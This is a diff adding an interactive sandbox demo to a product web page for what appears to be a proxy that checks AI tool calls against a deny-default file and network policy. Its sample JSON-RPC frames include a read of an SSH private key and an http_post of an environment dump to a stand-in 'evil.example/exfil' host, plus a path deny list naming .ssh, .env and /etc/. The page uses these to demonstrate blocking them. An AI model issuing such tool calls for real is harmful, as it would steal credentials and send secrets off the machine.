@@ -208,6 +208,27 @@
                 </div>
             </div>
 
+            <div class="product-section" id="aegismcp-sandbox">
+                <h2>Interactive `stdio` JSON-RPC &amp; Policy Sandbox</h2>
+                <p>
+                    Inspect how `aegis-proxy` parses JSON-RPC `tools/call` frames and evaluates deny-default Seatbelt / Landlock path and network rules in the browser.
+                </p>
+                <div style="background: rgba(15, 23, 42, 0.85); border: 1px solid rgba(59, 130, 246, 0.35); border-radius: 12px; padding: 1.5rem; margin-bottom: 2.5rem;">
+                    <div style="display: flex; gap: 0.65rem; flex-wrap: wrap; margin-bottom: 1rem;">
+                        <button type="button" onclick="loadAegisMcpPreset('ssh')" class="btn btn-secondary" style="font-size: 0.82rem; padding: 0.45rem 0.85rem; border-color: rgba(239,68,68,0.5); color: #fca5a5;">Preset 1: SSH Key Read (~/.ssh/id_ed25519)</button>
+                        <button type="button" onclick="loadAegisMcpPreset('net')" class="btn btn-secondary" style="font-size: 0.82rem; padding: 0.45rem 0.85rem; border-color: rgba(239,68,68,0.5); color: #fca5a5;">Preset 2: Unauthorized Egress Socket</button>
+                        <button type="button" onclick="loadAegisMcpPreset('workspace')" class="btn btn-secondary" style="font-size: 0.82rem; padding: 0.45rem 0.85rem; border-color: rgba(16,185,129,0.5); color: #6ee7b7;">Preset 3: Scoped Workspace Read</button>
+                    </div>
+                    <label for="mcp-jsonrpc-input" style="display: block; font-size: 0.85rem; font-family: monospace; color: #94a3b8; margin-bottom: 0.4rem;">JSON-RPC 2.0 Request Frame (Editable):</label>
+                    <textarea id="mcp-jsonrpc-input" rows="3" style="width: 100%; background: #090c13; color: #f8fafc; border: 1px solid #334155; border-radius: 8px; padding: 0.75rem; font-family: monospace; font-size: 0.85rem; margin-bottom: 1rem;">{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"read_file","arguments":{"path":"~/.ssh/id_ed25519"}}}</textarea>
+                    <div style="display: flex; gap: 1rem; align-items: center; flex-wrap: wrap; margin-bottom: 1rem;">
+                        <button type="button" onclick="runAegisMcpSandbox()" class="btn btn-primary btn-glow" style="cursor: pointer;">Evaluate Policy Frame</button>
+                        <span id="mcp-verdict-badge" style="font-family: monospace; font-weight: 700; color: #93c5fd;">Ready</span>
+                    </div>
+                    <pre id="mcp-output-json" style="background: #090c13; color: #cbd5e1; border: 1px solid #1e293b; border-radius: 8px; padding: 1rem; font-size: 0.82rem; overflow-x: auto; margin: 0;">Click "Evaluate Policy Frame" to simulate aegis-core inspection and Seatbelt/Landlock enforcement.</pre>
+                </div>
+            </div>
+
             <div class="product-section">
                 <h2>Key Deliverables</h2>
                 <div class="services-grid" style="display: grid; grid-template-columns: 1fr 1fr; gap: 2rem;">
@@ -279,6 +300,74 @@
         </div>
     </footer>
 
+    <script>
+        const AEGIS_PRESETS = {
+            ssh: '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"read_file","arguments":{"path":"~/.ssh/id_ed25519"}}}',
+            net: '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"http_post","arguments":{"url":"https://evil.example/exfil","body":"env_dump"}}}',
+            workspace: '{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"read_file","arguments":{"path":"/workspace/src/main.rs"}}}'
+        };
+
+        function loadAegisMcpPreset(key) {
+            const el = document.getElementById('mcp-jsonrpc-input');
+            if (el && AEGIS_PRESETS[key]) {
+                el.value = AEGIS_PRESETS[key];
+                runAegisMcpSandbox();
+            }
+        }
+
+        async function runAegisMcpSandbox() {
+            const raw = document.getElementById('mcp-jsonrpc-input')?.value || '{}';
+            let req;
+            try {
+                req = JSON.parse(raw);
+            } catch (e) {
+                document.getElementById('mcp-verdict-badge').textContent = 'JSON-RPC PARSE ERROR (-32700)';
+                return;
+            }
+            const t0 = performance.now();
+            const serialized = JSON.stringify(req);
+            const args = req?.params?.arguments || {};
+            const targetPath = String(args.path || '');
+            const targetUrl = String(args.url || '');
+
+            let decision = 'ALLOW';
+            let errno = '0 (OK)';
+            let reason = 'Scoped workspace read permitted under sandbox policy.';
+
+            if (targetPath.includes('.ssh') || targetPath.includes('.env') || targetPath.includes('/etc/') || targetPath.includes('..')) {
+                decision = 'DENY';
+                errno = 'EACCES: Denied by Seatbelt file-read* / Landlock path rule';
+                reason = `Sensitive path access blocked: ${targetPath}`;
+            } else if (targetUrl || String(req?.params?.name || '').includes('http')) {
+                decision = 'DENY';
+                errno = 'EPERM: Denied by Seatbelt network-outbound / Landlock TCP rule';
+                reason = `Outbound network socket blocked by default-deny policy: ${targetUrl || 'socket'}`;
+            } else if (targetPath && !targetPath.startsWith('/workspace/')) {
+                decision = 'DENY';
+                errno = 'EACCES: Outside allowed /workspace mount';
+                reason = `Path outside declared manifest root: ${targetPath}`;
+            }
+
+            const framingUs = Math.round((performance.now() - t0) * 1000) || 120;
+            const auditDigestBuf = await window.crypto.subtle.digest('SHA-256', new TextEncoder().encode(serialized + decision));
+            const auditSha = Array.from(new Uint8Array(auditDigestBuf)).map(b => b.toString(16).padStart(2, '0')).join('');
+
+            const result = {
+                decision,
+                kernel_enforcement: errno,
+                reason,
+                method: req.method,
+                tool_name: req?.params?.name || null,
+                framing_overhead_us: framingUs,
+                audit_sha256: auditSha
+            };
+
+            const badge = document.getElementById('mcp-verdict-badge');
+            badge.textContent = `${decision} | ${errno}`;
+            badge.style.color = decision === 'ALLOW' ? '#6ee7b7' : '#fca5a5';
+            document.getElementById('mcp-output-json').textContent = JSON.stringify(result, null, 2);
+        }
+    </script>
     <script src="script.js"></script>
 </body>
 
